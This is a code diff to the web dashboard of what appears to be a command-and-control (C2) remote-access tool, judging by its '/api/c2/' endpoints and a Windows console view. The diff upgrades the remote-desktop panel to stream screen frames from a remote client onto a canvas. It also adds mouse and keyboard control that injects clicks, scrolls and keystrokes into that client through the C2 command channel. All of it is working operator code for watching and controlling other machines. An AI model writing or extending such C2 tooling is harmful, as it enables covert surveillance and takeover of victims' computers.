@@ -605,8 +605,8 @@
 
                         <div style="display:flex;align-items:center;gap:8px;">
                             <label style="font-size:11px;font-weight:600;color:var(--text-secondary);text-transform:uppercase;letter-spacing:0.5px;white-space:nowrap;">FPS</label>
-                            <input type="range" class="slider-range" id="rdp-fps" min="1" max="30" value="10" style="width:100px;">
-                            <span id="rdp-fps-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:24px;">10</span>
+                            <input type="range" class="slider-range" id="rdp-fps" min="1" max="60" value="15" style="width:100px;">
+                            <span id="rdp-fps-val" style="font-family:var(--font-mono);font-size:13px;color:var(--primary);min-width:24px;">15</span>
                         </div>
 
                         <div style="display:flex;align-items:center;gap:8px;">
@@ -616,6 +616,15 @@
                         </div>
 
                         <span id="rdp-status" style="font-size:12px;color:var(--text-muted);margin-left:auto;">Stopped</span>
+                        <span id="rdp-fps-meter" style="font-size:11px;font-family:var(--font-mono);color:var(--primary);margin-left:8px;display:none;">0 fps</span>
+                        <button id="rdp-mouse-ctrl" class="btn" title="Toggle mouse control" style="font-size:12px;padding:6px 10px;background:rgba(255,255,255,0.05);border:1px solid var(--border-color);color:var(--text-muted);cursor:pointer;display:none;">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 3l7.07 16.97 2.51-7.39 7.39-2.51L3 3z"/><path d="M13 13l6 6"/></svg>
+                            Mouse
+                        </button>
+                        <button id="rdp-kb-ctrl" class="btn" title="Toggle keyboard control" style="font-size:12px;padding:6px 10px;background:rgba(255,255,255,0.05);border:1px solid var(--border-color);color:var(--text-muted);cursor:pointer;display:none;">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/></svg>
+                            Keyboard
+                        </button>
                     </div>
                 </div>
 
@@ -625,7 +634,7 @@
                         <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" style="opacity:0.15;"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
                         <span style="font-size:13px;">Press Start Stream to begin</span>
                     </div>
-                    <img id="rdp-frame" style="display:none;width:100%;height:auto;" alt="Remote Desktop">
+                    <canvas id="rdp-frame" tabindex="0" style="display:none;width:100%;height:auto;background:#000;outline:none;" alt="Remote Desktop"></canvas>
                 </div>
             </div>
 
@@ -1606,11 +1615,17 @@ C:\&gt;</div>
         const rdpQualitySlider = document.getElementById('rdp-quality');
         const rdpQualityVal = document.getElementById('rdp-quality-val');
         const rdpStatus = document.getElementById('rdp-status');
+        const rdpFpsMeter = document.getElementById('rdp-fps-meter');
         const rdpPlaceholder = document.getElementById('rdp-placeholder');
         const rdpFrame = document.getElementById('rdp-frame');
-        let rdpPollInterval = null;
+        const rdpCtx = rdpFrame.getContext('2d', { alpha: false });
         let rdpLastTs = 0;
         let rdpRunning = false;
+        let rdpTimer = null;
+        let rdpFetching = false;
+        let rdpImgBitmap = null;
+        let rdpFrameTimes = [];
+        let rdpLastFpsUpdate = 0;
 
         rdpFpsSlider.addEventListener('input', () => {
             rdpFpsVal.textContent = rdpFpsSlider.value;
@@ -1632,22 +1647,41 @@ C:\&gt;</div>
             }
         });
 
+        function updateFpsMeter() {
+            const now = performance.now();
+            rdpFrameTimes.push(now);
+            while (rdpFrameTimes.length > 0 && rdpFrameTimes[0] < now - 2000) rdpFrameTimes.shift();
+            if (now - rdpLastFpsUpdate > 500 && rdpFrameTimes.length > 1) {
+                const span = (rdpFrameTimes[rdpFrameTimes.length - 1] - rdpFrameTimes[0]) / 1000;
+                const fps = (rdpFrameTimes.length - 1) / span;
+                rdpFpsMeter.textContent = fps.toFixed(1) + ' fps';
+                rdpLastFpsUpdate = now;
+            }
+        }
+
         async function fetchFrame() {
-            if (!rdpRunning) return;
+            if (!rdpRunning || rdpFetching) return;
+            rdpFetching = true;
             try {
-                const res = await fetch('/api/c2/frame/' + encodeURIComponent(clientId) + '?ts=' + rdpLastTs);
+                const res = await fetch('/api/c2/frame_binary/' + encodeURIComponent(clientId) + '?ts=' + rdpLastTs, { cache: 'no-store' });
                 if (res.status === 200) {
-                    const data = await res.json();
-                    if (data.b64) {
-                        rdpLastTs = data.ts;
-                        rdpFrame.src = 'data:image/jpeg;base64,' + data.b64;
-                        rdpFrame.style.display = 'block';
-                        rdpPlaceholder.style.display = 'none';
-                        rdpStatus.textContent = 'Streaming';
-                        rdpStatus.style.color = 'var(--success, #10b981)';
+                    const tsHdr = res.headers.get('X-Frame-Ts');
+                    if (tsHdr) rdpLastTs = parseFloat(tsHdr);
+                    const blob = await res.blob();
+                    if (rdpImgBitmap) rdpImgBitmap.close();
+                    rdpImgBitmap = await createImageBitmap(blob);
+                    if (rdpFrame.width !== rdpImgBitmap.width || rdpFrame.height !== rdpImgBitmap.height) {
+                        rdpFrame.width = rdpImgBitmap.width;
+                        rdpFrame.height = rdpImgBitmap.height;
                     }
+                    rdpCtx.drawImage(rdpImgBitmap, 0, 0);
+                    rdpFrame.style.display = 'block';
+                    rdpPlaceholder.style.display = 'none';
+                    rdpStatus.textContent = 'Streaming';
+                    rdpStatus.style.color = 'var(--success, #10b981)';
+                    rdpFpsMeter.style.display = 'inline';
+                    updateFpsMeter();
                 } else if (res.status === 204 || res.status === 304) {
-                    // No new frame yet
                     if (rdpStatus.textContent === 'Connecting...') {
                         rdpStatus.textContent = 'Waiting for stream...';
                     }
@@ -1658,12 +1692,155 @@ C:\&gt;</div>
             } catch {
                 rdpStatus.textContent = 'Connection error';
                 rdpStatus.style.color = 'var(--danger, #ef4444)';
+            } finally {
+                rdpFetching = false;
             }
         }
 
+        function rdpScheduleNext() {
+            if (!rdpRunning) return;
+            clearTimeout(rdpTimer);
+            const fps = parseInt(rdpFpsSlider.value) || 15;
+            const delay = Math.max(20, Math.floor(1000 / fps));
+            rdpTimer = setTimeout(async () => {
+                await fetchFrame();
+                rdpScheduleNext();
+            }, delay);
+        }
+
+        // ── Remote Desktop input control ─────────────────────────────────────
+        const rdpMouseCtrlBtn = document.getElementById('rdp-mouse-ctrl');
+        const rdpKbCtrlBtn = document.getElementById('rdp-kb-ctrl');
+        let rdpMouseEnabled = false;
+        let rdpKbEnabled = false;
+        let rdpLastMoveX = -1, rdpLastMoveY = -1;
+        const rdpKeysDown = new Set();
+
+        async function sendInput(payload) {
+            try {
+                await fetch('/api/c2/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ client_id: clientId, command: 'input:' + payload })
+                });
+            } catch {}
+        }
+
+        function canvasToScreenX(e) {
+            const rect = rdpFrame.getBoundingClientRect();
+            const relX = (e.clientX - rect.left) / rect.width;
+            return relX.toFixed(4);
+        }
+        function canvasToScreenY(e) {
+            const rect = rdpFrame.getBoundingClientRect();
+            const relY = (e.clientY - rect.top) / rect.height;
+            return relY.toFixed(4);
+        }
+
+        function isLockKey(code) {
+            // VK_CAPITAL(20), VK_NUMLOCK(90), VK_SCROLL(145)
+            return code === 20 || code === 145 || (code & 0x10000) /* NumLock via Keys enum */;
+        }
+
+        function rdpToggleMouse() {
+            rdpMouseEnabled = !rdpMouseEnabled;
+            if (rdpMouseEnabled) {
+                rdpMouseCtrlBtn.style.color = 'var(--primary)';
+                rdpMouseCtrlBtn.style.borderColor = 'var(--primary)';
+                rdpMouseCtrlBtn.style.background = 'rgba(37,99,235,0.12)';
+            } else {
+                rdpMouseCtrlBtn.style.color = 'var(--text-muted)';
+                rdpMouseCtrlBtn.style.borderColor = 'var(--border-color)';
+                rdpMouseCtrlBtn.style.background = 'rgba(255,255,255,0.05)';
+            }
+        }
+
+        function rdpToggleKeyboard() {
+            rdpKbEnabled = !rdpKbEnabled;
+            if (rdpKbEnabled) {
+                rdpKbCtrlBtn.style.color = 'var(--primary)';
+                rdpKbCtrlBtn.style.borderColor = 'var(--primary)';
+                rdpKbCtrlBtn.style.background = 'rgba(37,99,235,0.12)';
+                rdpFrame.focus();
+            } else {
+                rdpKbCtrlBtn.style.color = 'var(--text-muted)';
+                rdpKbCtrlBtn.style.borderColor = 'var(--border-color)';
+                rdpKbCtrlBtn.style.background = 'rgba(255,255,255,0.05)';
+                rdpFrame.blur();
+                rdpKeysDown.clear();
+            }
+        }
+
+        rdpMouseCtrlBtn.addEventListener('click', rdpToggleMouse);
+        rdpKbCtrlBtn.addEventListener('click', rdpToggleKeyboard);
+
+        rdpFrame.addEventListener('mousemove', (e) => {
+            if (!rdpMouseEnabled || !rdpRunning) return;
+            const x = parseFloat(canvasToScreenX(e));
+            const y = parseFloat(canvasToScreenY(e));
+            if (Math.abs(x - rdpLastMoveX) < 0.01 && Math.abs(y - rdpLastMoveY) < 0.01) return; // 15px-equivalent
+            rdpLastMoveX = x; rdpLastMoveY = y;
+            sendInput('move:' + x.toFixed(4) + ',' + y.toFixed(4));
+        });
+
+        rdpFrame.addEventListener('mousedown', (e) => {
+            if (!rdpMouseEnabled || !rdpRunning) return;
+            e.preventDefault();
+            const btn = e.button === 2 ? 'right' : (e.button === 1 ? 'middle' : 'left');
+            sendInput('move:' + canvasToScreenX(e) + ',' + canvasToScreenY(e));
+            sendInput('mousedown:' + btn);
+        });
+
+        rdpFrame.addEventListener('mouseup', (e) => {
+            if (!rdpMouseEnabled || !rdpRunning) return;
+            e.preventDefault();
+            const btn = e.button === 2 ? 'right' : (e.button === 1 ? 'middle' : 'left');
+            sendInput('mouseup:' + btn);
+        });
+
+        rdpFrame.addEventListener('dblclick', (e) => {
+            if (!rdpMouseEnabled || !rdpRunning) return;
+            e.preventDefault();
+            sendInput('mousedown:left');
+            sendInput('mouseup:left');
+            sendInput('mousedown:left');
+            sendInput('mouseup:left');
+        });
+
+        rdpFrame.addEventListener('wheel', (e) => {
+            if (!rdpMouseEnabled || !rdpRunning) return;
+            e.preventDefault();
+            const delta = Math.round(e.deltaY / 100); // ±1 per wheel notch
+            sendInput('scroll:' + delta);
+        });
+
+        rdpFrame.addEventListener('contextmenu', (e) => { if (rdpMouseEnabled) e.preventDefault(); });
+
+        rdpFrame.addEventListener('keydown', (e) => {
+            if (!rdpKbEnabled || !rdpRunning) return;
+            if (!isLockKey(e.keyCode)) e.preventDefault();
+            const code = e.keyCode & 0xFF; // strip Keys enum modifiers
+            if (!rdpKeysDown.has(code)) {
+                rdpKeysDown.add(code);
+                sendInput('kdown:' + code);
+            }
+        });
+
+        rdpFrame.addEventListener('keyup', (e) => {
+            if (!rdpKbEnabled || !rdpRunning) return;
+            if (!isLockKey(e.keyCode)) e.preventDefault();
+            const code = e.keyCode & 0xFF;
+            if (rdpKeysDown.has(code)) {
+                rdpKeysDown.delete(code);
+                sendInput('kup:' + code);
+            }
+        });
+
+        rdpFrame.addEventListener('keypress', (e) => { if (rdpKbEnabled) e.preventDefault(); });
+
         rdpToggleBtn.addEventListener('click', async () => {
             if (!rdpRunning) {
-                const fps = parseInt(rdpFpsSlider.value) || 10;
+                const fps = parseInt(rdpFpsSlider.value) || 15;
                 const quality = rdpQualitySlider.value;
                 const mode = rdpModeSelect.value;
                 try {
@@ -1674,16 +1851,18 @@ C:\&gt;</div>
                     });
                     rdpRunning = true;
                     rdpLastTs = 0;
+                    rdpFrameTimes = [];
+                    rdpLastFpsUpdate = 0;
+                    rdpFpsMeter.textContent = '0 fps';
                     rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="6" y="6" width="12" height="12" rx="2"/></svg> Stop';
                     rdpToggleBtn.classList.remove('btn-primary');
                     rdpToggleBtn.classList.add('btn-danger');
                     rdpStatus.textContent = 'Connecting...';
                     rdpStatus.style.color = 'var(--warning, #f59e0b)';
-
-                    if (rdpPollInterval) clearInterval(rdpPollInterval);
-                    const pollDelay = Math.max(33, Math.floor(1000 / fps));
-                    rdpPollInterval = setInterval(fetchFrame, pollDelay);
-                    fetchFrame();
+                    rdpFpsMeter.style.display = 'inline';
+                    rdpMouseCtrlBtn.style.display = 'inline-flex';
+                    rdpKbCtrlBtn.style.display = 'inline-flex';
+                    rdpScheduleNext();
                 } catch {
                     rdpStatus.textContent = 'Failed to start';
                     rdpStatus.style.color = 'var(--danger, #ef4444)';
@@ -1696,8 +1875,15 @@ C:\&gt;</div>
                         body: JSON.stringify({ client_id: clientId, command: 'rdp_stop' })
                     });
                 } catch {}
-                if (rdpPollInterval) { clearInterval(rdpPollInterval); rdpPollInterval = null; }
+                clearTimeout(rdpTimer);
+                rdpTimer = null;
                 rdpRunning = false;
+                rdpFetching = false;
+                rdpMouseEnabled = false;
+                rdpKbEnabled = false;
+                rdpMouseCtrlBtn.style.display = 'none';
+                rdpKbCtrlBtn.style.display = 'none';
+                if (rdpImgBitmap) { rdpImgBitmap.close(); rdpImgBitmap = null; }
                 rdpToggleBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polygon points="5 3 19 12 5 21 5 3"/></svg> Start Stream';
                 rdpToggleBtn.classList.remove('btn-danger');
                 rdpToggleBtn.classList.add('btn-primary');
@@ -1705,6 +1891,7 @@ C:\&gt;</div>
                 rdpPlaceholder.style.display = 'flex';
                 rdpStatus.textContent = 'Stopped';
                 rdpStatus.style.color = 'var(--text-muted)';
+                rdpFpsMeter.style.display = 'none';
             }
         });
 
